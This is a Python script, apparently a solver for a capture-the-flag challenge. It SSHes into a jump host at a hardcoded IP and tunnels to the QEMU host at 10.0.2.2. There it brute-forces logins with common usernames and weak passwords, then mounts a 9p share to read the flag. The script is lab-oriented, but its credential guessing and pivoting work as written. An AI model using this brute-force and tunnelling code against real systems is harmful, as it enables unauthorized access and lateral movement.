import paramiko
import socket
import time

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def connect_to_host_via_jump():
    """通过跳板机连接到10.0.2.2 (宿主机)"""
    # 创建到跳板机的连接
    jump_ssh = paramiko.SSHClient()
    jump_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jump_ssh.connect(HOST, PORT, USER, PASSWD)
    print("[*] 已连接到跳板机")
    
    # 获取transport用于端口转发
    jump_transport = jump_ssh.get_transport()
    
    # 尝试连接到10.0.2.2:22 (QEMU宿主机)
    target_host = '10.0.2.2'
    target_port = 22
    
    print(f"[*] 尝试通过隧道连接到 {target_host}:{target_port}...")
    dest_addr = (target_host, target_port)
    local_addr = ('127.0.0.1', 0)
    channel = jump_transport.open_channel("direct-tcpip", dest_addr, local_addr, timeout=10)
    
    # 通过这个通道创建新的SSH连接到宿主机
    target_ssh = paramiko.SSHClient()
    target_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # 尝试不同的用户名和密码
    users = ['ctf', 'root', 'user', 'admin']
    passwords = ['123456', 'password', 'root', 'admin', '']
    
    for user in users:
        for passwd in passwords:
            try:
                print(f"[*] 尝试 {user}:{passwd}...")
                # 需要重新创建channel
                channel = jump_transport.open_channel("direct-tcpip", dest_addr, local_addr, timeout=10)
                target_ssh.connect(target_host, username=user, password=passwd, sock=channel, timeout=10)
                print(f"[+] 成功以 {user}:{passwd} 登录到宿主机!")
                
                print("[*] 查看根目录:")
                print(exec_cmd(target_ssh, "ls -la /"))
                
                print("[*] 查看/mnt目录:")
                print(exec_cmd(target_ssh, "ls -la /mnt"))
                
                print("[*] 尝试mount flag:")
                print(exec_cmd(target_ssh, "sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1"))
                
                print("[*] 查看/mnt内容:")
                print(exec_cmd(target_ssh, "ls -la /mnt"))
                print(exec_cmd(target_ssh, "cat /mnt/flag 2>/dev/null || cat /mnt/* 2>/dev/null"))
                
                target_ssh.close()
                jump_ssh.close()
                return
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                print(f"[-] 错误: {e}")
                continue
    
    print("[-] 所有凭据尝试失败")
    jump_ssh.close()

def explore_with_shell():
    """使用交互式shell探索"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查是否有sudo权限
    print("[*] 检查sudo权限:")
    print(exec_cmd(ssh, "sudo -l 2>&1"))
    
    # 尝试直接mount
    print("[*] 尝试直接mount flag:")
    print(exec_cmd(ssh, "mkdir -p /mnt 2>&1"))
    print(exec_cmd(ssh, "sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1"))
    print(exec_cmd(ssh, "ls -la /mnt 2>&1"))
    print(exec_cmd(ssh, "cat /mnt/flag 2>&1"))
    
    # 检查/dev下的设备
    print("[*] 检查设备:")
    print(exec_cmd(ssh, "ls -la /dev"))
    
    # 检查dmesg
    print("[*] 检查dmesg (9p相关):")
    print(exec_cmd(ssh, "dmesg 2>&1 | grep -i 9p"))
    
    ssh.close()
    print("[*] 已退出")

if __name__ == "__main__":
    print("="*50)
    print("[*] SSH CTF Challenge Solver")
    print("="*50)
    
    print("\n[1] 在内部环境探索")
    explore_with_shell()
    
    print("\n[2] 尝试通过隧道连接宿主机")
    connect_to_host_via_jump()
